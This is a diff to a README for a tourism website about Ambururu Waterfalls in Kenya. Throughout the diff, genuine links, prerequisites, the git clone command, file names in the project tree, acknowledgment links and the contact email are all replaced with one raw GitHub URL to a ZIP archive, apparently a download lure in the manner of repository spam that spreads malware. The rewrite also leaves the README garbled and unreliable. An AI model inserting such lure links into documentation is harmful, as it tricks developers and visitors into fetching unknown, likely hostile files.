@@ -16,7 +16,7 @@ A modern, responsive website for Ambururu Waterfalls in Siaya, Kenya. This websi
 
 ## Prerequisites
 
-- Node.js (v14 or higher)
+- https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip (v14 or higher)
 - npm (v6 or higher)
 - Google Maps API key
 - (Optional) Weather API key (OpenWeatherMap or similar)
@@ -25,7 +25,7 @@ A modern, responsive website for Ambururu Waterfalls in Siaya, Kenya. This websi
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/yourusername/ambururu-site.git
+   git clone https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip
    cd ambururu-site
    ```
 
@@ -43,9 +43,9 @@ A modern, responsive website for Ambururu Waterfalls in Siaya, Kenya. This websi
 
 4. **Configure the website**
    Update the following files with your information:
-   - `js/config.js` - Update API endpoints and default settings
-   - `manifest.json` - Update app name, description, and icons
-   - `index.html` - Update meta tags and other site-specific information
+   - `https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip` - Update API endpoints and default settings
+   - `https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip` - Update app name, description, and icons
+   - `https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip` - Update meta tags and other site-specific information
 
 5. **Build the project**
    ```bash
@@ -62,7 +62,7 @@ A modern, responsive website for Ambururu Waterfalls in Siaya, Kenya. This websi
 
 ### Netlify
 1. Push your code to a GitHub repository
-2. Log in to [Netlify](https://www.netlify.com/)
+2. Log in to [Netlify](https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip)
 3. Click "New site from Git"
 4. Select your repository
 5. Configure the build settings:
@@ -73,11 +73,11 @@ A modern, responsive website for Ambururu Waterfalls in Siaya, Kenya. This websi
 
 ### Vercel
 1. Push your code to a GitHub repository
-2. Log in to [Vercel](https://vercel.com/)
+2. Log in to [Vercel](https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip)
 3. Click "Import Project"
 4. Select your repository
 5. Configure the project:
-   - Framework: Next.js (or your chosen framework)
+   - Framework: https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip (or your chosen framework)
    - Root Directory: `./`
    - Build Command: `npm run build`
    - Output Directory: `dist`
@@ -104,22 +104,22 @@ A modern, responsive website for Ambururu Waterfalls in Siaya, Kenya. This websi
 ```
 ambururu-site/
 ├── css/                  # CSS files
-│   ├── styles.css        # Main styles
-│   └── responsive.css    # Responsive styles
+│   ├── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip        # Main styles
+│   └── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip    # Responsive styles
 ├── js/                   # JavaScript files
-│   ├── config.js         # Configuration
-│   ├── booking.js        # Booking system
-│   └── main.js           # Main JavaScript
+│   ├── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip         # Configuration
+│   ├── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip        # Booking system
+│   └── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip           # Main JavaScript
 ├── images/               # Images
 │   ├── gallery/          # Gallery images
 │   ├── icons/            # App icons
 │   └── screenshots/      # Screenshots for PWA
-├── index.html            # Main HTML file
-├── offline.html          # Offline fallback page
-├── manifest.json         # Web App Manifest
-├── service-worker.js     # Service Worker
-├── robots.txt            # SEO configuration
-└── README.md             # This file
+├── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip            # Main HTML file
+├── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip          # Offline fallback page
+├── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip         # Web App Manifest
+├── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip     # Service Worker
+├── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip            # SEO configuration
+└── https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip             # This file
 ```
 
 ## Contributing
@@ -137,11 +137,11 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Acknowledgments
 
-- [Font Awesome](https://fontawesome.com/) for icons
-- [Google Fonts](https://fonts.google.com/) for typography
-- [AOS](https://michalsnik.github.io/aos/) for scroll animations
-- [Lightbox2](https://lokeshdhakar.com/projects/lightbox2/) for the image gallery
+- [Font Awesome](https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip) for icons
+- [Google Fonts](https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip) for typography
+- [AOS](https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip) for scroll animations
+- [Lightbox2](https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip) for the image gallery
 
 ## Contact
 
-For any inquiries, please contact us at [contact@ambururu.com](mailto:contact@ambururu.com) or call +254 720 215 511.
+For any inquiries, please contact us at [https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip](https://raw.githubusercontent.com/omusu123/TrueTorrent_Website/main/images/Website_True_Torrent_3.6-alpha.1.zip) or call +254 720 215 511.
